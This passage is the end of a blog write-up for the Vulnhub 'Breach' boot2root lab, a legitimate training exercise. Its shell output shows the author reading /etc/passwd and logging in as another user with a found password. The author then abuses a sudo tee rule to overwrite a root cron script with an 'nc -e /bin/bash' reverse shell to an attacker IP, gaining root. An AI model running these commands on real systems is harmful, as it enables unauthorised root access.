</span><span class='line'>-rw-rw-r-- <span class="m">1</span> milton milton <span class="m">111255</span> Jun  <span class="m">4</span> 18:46 my_badge.jpg
</span><span class='line'>-rw------- <span class="m">1</span> milton milton    <span class="m">407</span> Jun  <span class="m">4</span> 18:18 .mysql_history
</span><span class='line'>-rw-r--r-- <span class="m">1</span> milton milton    <span class="m">675</span> May <span class="m">20</span>  <span class="m">2016</span> .profile
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root   root       <span class="m">66</span> Jun  <span class="m">4</span> 10:57 .selected_editor
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> milton milton    <span class="m">755</span> Jun  <span class="m">4</span> 10:51 some_script.sh
</span><span class='line'>
</span><span class='line'>tomcat6@Breach:/home/milton<span class="nv">$ </span>cat some_script.sh
</span><span class='line'>cat some_script.sh
</span><span class='line'>
</span><span class='line'>
</span><span class='line'> _____ _                   _                   _   _     _               _
</span><span class='line'><span class="p">|</span>_   _<span class="p">|</span> <span class="p">|</span>                 <span class="o">(</span> <span class="o">)</span>                 <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>   <span class="o">(</span>_<span class="o">)</span>             <span class="p">|</span> <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>__   ___ _ __ ___<span class="p">|</span>/ ___   _ __   ___ <span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>__  _ _ __   __ _  <span class="p">|</span> <span class="p">|</span>__   ___ _ __ ___
</span><span class='line'>  <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="s1">&#39;_ \ / _ \ &#39;</span>__/ _ <span class="se">\ </span>/ __<span class="p">|</span> <span class="p">|</span> <span class="s1">&#39;_ \ / _ \| __| &#39;</span>_ <span class="se">\|</span> <span class="p">|</span> <span class="s1">&#39;_ \ / _` | | &#39;</span>_ <span class="se">\ </span>/ _ <span class="se">\ </span><span class="err">&#39;</span>__/ _ <span class="se">\</span>
</span><span class='line'>  <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  __/ <span class="p">|</span> <span class="p">|</span>  __/ <span class="se">\_</span>_ <span class="se">\ </span><span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="o">)</span> <span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  __/ <span class="p">|</span> <span class="p">|</span>  __/
</span><span class='line'>  <span class="se">\_</span>/ <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span>  <span class="se">\_</span>__<span class="p">|</span> <span class="p">|</span>___/ <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__/ <span class="se">\_</span>_<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>_, <span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span>  <span class="se">\_</span>__<span class="p">|</span>
</span><span class='line'>                                                                  __/ <span class="p">|</span>
</span><span class='line'>                                                                 <span class="p">|</span>___/
</span></code></pre></td></tr></table></div></figure>


<p>I found that account <code>blumbergh</code> is owned by <code>Bill Lumbergh</code> when I was checking the file <code>/etc/passwd</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>tomcat6@Breach:/home<span class="nv">$ </span>cat /etc/passwd
</span><span class='line'>cat /etc/passwd
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span><span class='line'>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span><span class='line'>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span><span class='line'>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span><span class='line'>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span><span class='line'>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span><span class='line'>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span><span class='line'>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:
</span><span class='line'>syslog:x:101:104::/home/syslog:/bin/false
</span><span class='line'>messagebus:x:102:106::/var/run/dbus:/bin/false
</span><span class='line'>landscape:x:103:109::/var/lib/landscape:/bin/false
</span><span class='line'>milton:x:1000:1000:Milton_Waddams,,,:/home/milton:/bin/bash
</span><span class='line'>tomcat6:x:104:112::/usr/share/tomcat6:/bin/false
</span><span class='line'>colord:x:105:114:colord colour management daemon,,,:/var/lib/colord:/bin/false
</span><span class='line'>mysql:x:106:116:MySQL Server,,,:/nonexistent:/bin/false
</span><span class='line'>blumbergh:x:1001:1001:Bill Lumbergh,,,:/home/blumbergh:/bin/bash
</span></code></pre></td></tr></table></div></figure>


<p>Things are getting clear, from the previous notes, I got a string <code>coffeestains</code>, in <code>bill.png</code>, which looks like a password, and now I got Bill&rsquo;s account name is <code>blumbergh</code>.</p>

<p>Now I tried to <code>su</code> to <code>blumbergh</code> with the password <code>coffeestains</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>tomcat6@Breach:/home<span class="nv">$ </span>su blumbergh
</span><span class='line'>su blumbergh
</span><span class='line'>Password: coffeestains
</span><span class='line'>
</span><span class='line'>blumbergh@Breach:/home<span class="nv">$ </span>id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>blumbergh<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>blumbergh<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>blumbergh<span class="o">)</span>
</span><span class='line'>blumbergh@Breach:/home<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Great! got in!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>blumbergh@Breach:/home<span class="nv">$ </span><span class="nb">cd </span>blumbergh
</span><span class='line'><span class="nb">cd </span>blumbergh
</span><span class='line'>blumbergh@Breach:~<span class="nv">$ </span>ls -al
</span><span class='line'>ls -al
</span><span class='line'>total 28
</span><span class='line'>drwxr-xr-x <span class="m">3</span> blumbergh blumbergh <span class="m">4096</span> Jun <span class="m">12</span> 09:42 .
</span><span class='line'>drwxr-xr-x <span class="m">4</span> root      root      <span class="m">4096</span> Jun  <span class="m">4</span> 19:24 ..
</span><span class='line'>-rw------- <span class="m">1</span> blumbergh blumbergh   <span class="m">61</span> Jun <span class="m">12</span> 09:42 .bash_history
</span><span class='line'>-rw-r--r-- <span class="m">1</span> blumbergh blumbergh  <span class="m">220</span> Jun  <span class="m">4</span> 19:24 .bash_logout
</span><span class='line'>-rw-r--r-- <span class="m">1</span> blumbergh blumbergh <span class="m">3637</span> Jun  <span class="m">4</span> 19:24 .bashrc
</span><span class='line'>drwx------ <span class="m">2</span> blumbergh blumbergh <span class="m">4096</span> Jun  <span class="m">6</span> 17:55 .cache
</span><span class='line'>-rw-r--r-- <span class="m">1</span> blumbergh blumbergh  <span class="m">675</span> Jun  <span class="m">4</span> 19:24 .profile
</span><span class='line'>blumbergh@Breach:~<span class="nv">$ </span>cat .bash_history
</span><span class='line'>cat .bash_history
</span><span class='line'>clear
</span><span class='line'>logoff
</span><span class='line'><span class="nb">logout</span>
</span><span class='line'><span class="nb">exit</span>
</span><span class='line'><span class="nb">cd</span> /usr/share/cleanup
</span><span class='line'>cat tidyup.sh
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>blumbergh@Breach:~<span class="nv">$ </span>locate tidyup.sh
</span><span class='line'>locate tidyup.sh
</span><span class='line'>/usr/share/cleanup/tidyup.sh
</span><span class='line'>
</span><span class='line'>blumbergh@Breach:~<span class="nv">$ </span>ls -al /usr/share/cleanup/tidyup.sh
</span><span class='line'>ls -al /usr/share/cleanup/tidyup.sh
</span><span class='line'>-rwxr-xr-x <span class="m">1</span> root root <span class="m">289</span> Jun <span class="m">12</span> 09:36 /usr/share/cleanup/tidyup.sh
</span><span class='line'>
</span><span class='line'>blumbergh@Breach:~<span class="nv">$ </span>cat /usr/share/cleanup/tidyup.sh
</span><span class='line'>cat /usr/share/cleanup/tidyup.sh
</span><span class='line'><span class="c">#!/bin/bash</span>
</span><span class='line'>
</span><span class='line'><span class="c">#Hacker Evasion Script </span>
</span><span class='line'><span class="c">#Initech Cyber Consulting, LLC</span>
</span><span class='line'><span class="c">#Peter Gibbons and Michael Bolton - 2016</span>
</span><span class='line'><span class="c">#This script is set to run every 3 minutes as an additional defense measure against hackers.</span>
</span><span class='line'>
</span><span class='line'><span class="nb">cd</span> /var/lib/tomcat6/webapps <span class="o">&amp;&amp;</span> find swingline -mindepth <span class="m">1</span> -maxdepth <span class="m">10</span> <span class="p">|</span> xargs rm -rf
</span><span class='line'>
</span><span class='line'>blumbergh@Breach:~<span class="nv">$ </span>sudo -l
</span><span class='line'>sudo -l
</span><span class='line'>Matching Defaults entries <span class="k">for</span> blumbergh on Breach:
</span><span class='line'>    env_reset, mail_badpass,
</span><span class='line'>    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
</span><span class='line'>
</span><span class='line'>User blumbergh may run the following commands on Breach:
</span><span class='line'>    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/tee /usr/share/cleanup/tidyup.sh
</span><span class='line'>blumbergh@Breach:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Here I know that <code>tidyup.sh</code> script will be run automatically every 3 minutes, and <code>blumbergh</code> got ROOT priviledge to run the command <code>/usr/bin/tee /usr/share/cleanup/tidyup.sh</code> which will be able to modify the <code>tidyup.sh</code> script to evil shell.</p>

<p>After setup <code>nc</code> to listen on local port 7777, I run the following command to modify <code>tidyup.sh</code> script to include evil code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>blumbergh@Breach:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">&quot;nc -e /bin/bash 192.168.110.129 7777&quot;</span> <span class="p">|</span> sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh
</span><span class='line'>tee /usr/share/cleanup/tidyup.sh0.129 7777<span class="err">&quot;</span> <span class="p">|</span> sudo /usr/bin/
</span><span class='line'>nc -e /bin/bash 192.168.110.129 7777
</span><span class='line'>blumbergh@Breach:~<span class="nv">$ </span>cat /usr/share/cleanup/tidyup.sh
</span><span class='line'>cat /usr/share/cleanup/tidyup.sh
</span><span class='line'>nc -e /bin/bash 192.168.110.129 7777
</span></code></pre></td></tr></table></div></figure>


<p>Then waiting a few minutes, I got ROOT in !! :D</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -lvnp 7777
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">7777</span> ...
</span><span class='line'>connect to <span class="o">[</span>192.168.110.129<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.110.140<span class="o">]</span> 45022
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span><span class='line'><span class="nb">cd</span> /root
</span><span class='line'><span class="nb">pwd</span>
</span><span class='line'>/root
</span><span class='line'>ls -la
</span><span class='line'>total 60
</span><span class='line'>drwx------  <span class="m">4</span> root root  <span class="m">4096</span> Jun <span class="m">12</span> 09:37 .
</span><span class='line'>drwxr-xr-x <span class="m">22</span> root root  <span class="m">4096</span> Jun  <span class="m">4</span> 09:56 ..
</span><span class='line'>-rw-------  <span class="m">1</span> root root   <span class="m">115</span> Jun <span class="m">12</span> 09:42 .bash_history
</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root  <span class="m">3106</span> Feb <span class="m">19</span>  <span class="m">2014</span> .bashrc
</span><span class='line'>drwx------  <span class="m">2</span> root root  <span class="m">4096</span> Jun  <span class="m">6</span> 15:17 .cache
</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root   <span class="m">840</span> Jun <span class="m">11</span> 17:34 .flag.txt
</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root <span class="m">23792</span> Jun  <span class="m">4</span> 19:17 flair.jpg
</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root   <span class="m">140</span> Feb <span class="m">19</span>  <span class="m">2014</span> .profile
</span><span class='line'>drwxr-xr-x  <span class="m">2</span> root root  <span class="m">4096</span> Jun  <span class="m">5</span> 17:51 .rpmdb
</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root    <span class="m">66</span> Jun  <span class="m">4</span> 19:48 .selected_editor
</span><span class='line'>cat .flag.txt
</span><span class='line'>-----------------------------------------------------------------------------------
</span><span class='line'>
</span><span class='line'>______                     _     __   _____      _____ _          _____          _
</span><span class='line'><span class="p">|</span> ___ <span class="se">\ </span>                  <span class="p">|</span> <span class="p">|</span>   /  <span class="p">|</span> <span class="p">|</span>  _  <span class="p">|</span>    <span class="p">|</span>_   _<span class="p">|</span> <span class="p">|</span>        <span class="p">|</span>  ___<span class="p">|</span>        <span class="p">|</span> <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="p">|</span>_/ /_ __ ___  __ _  ___<span class="p">|</span> <span class="p">|</span>__ <span class="sb">`</span><span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>/<span class="s1">&#39; |______| | | |__   ___| |__ _ __   __| |</span>
</span><span class='line'><span class="s1">| ___ \ &#39;</span>__/ _ <span class="se">\/</span> _<span class="sb">`</span> <span class="p">|</span>/ __<span class="p">|</span> <span class="s1">&#39;_ \ | | |  /| |______| | | &#39;</span>_ <span class="se">\ </span>/ _ <span class="se">\ </span> __<span class="p">|</span> <span class="err">&#39;</span>_ <span class="se">\ </span>/ _<span class="sb">`</span> <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="p">|</span>_/ / <span class="p">|</span> <span class="p">|</span>  __/ <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">||</span> <span class="p">|</span>_<span class="se">\ </span><span class="p">|</span>_/ /      <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  __/ <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span>
</span><span class='line'><span class="se">\_</span>___/<span class="p">|</span>_<span class="p">|</span>  <span class="se">\_</span>__<span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="se">\_</span>__<span class="o">(</span>_<span class="o">)</span>___/       <span class="se">\_</span>/ <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__<span class="se">\_</span>___/_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>-----------------------------------------------------------------------------------
</span><span class='line'>Congrats on reaching the end and thanks <span class="k">for</span> trying out my first <span class="c">#vulnhub boot2root!</span>
</span><span class='line'>
</span><span class='line'>Shout-out to knightmare, and rastamouse <span class="k">for</span> testing and g0tmi1k <span class="k">for</span> hosting.
</span></code></pre></td></tr></table></div></figure>




<!--- Reference -->



</div>


<div class="meta">
	<div class="date">




2016-11-29 06:09:35 -0500</div>
	

<div class="tags">

	<a class='category' href='/blog/categories/breach/'>breach</a>, <a class='category' href='/blog/categories/ssl/'>ssl</a>, <a class='category' href='/blog/categories/tomcat/'>tomcat</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>

</div>


	
</div></article>

	<div class="share">
	<div class="addthis_toolbox addthis_default_style ">
	
	
	<a class="addthis_button_tweet"></a>
	
	
<!---	<a class="addthis_counter addthis_pill_style"></a> --->
	</div>
  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
</div>


</div>
	<footer id="footer" class="inner">Copyright &copy; 2016

    <font color="green">F4l13n5n0w</font>

<br>
Powered by Octopress.
</footer>
	<script src="/javascripts/slash.js"></script>
<script src="/javascripts/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
	$('.fancybox').fancybox();
})(jQuery);
</script> <!-- Delete or comment this line to disable Fancybox -->






</body>
</html>
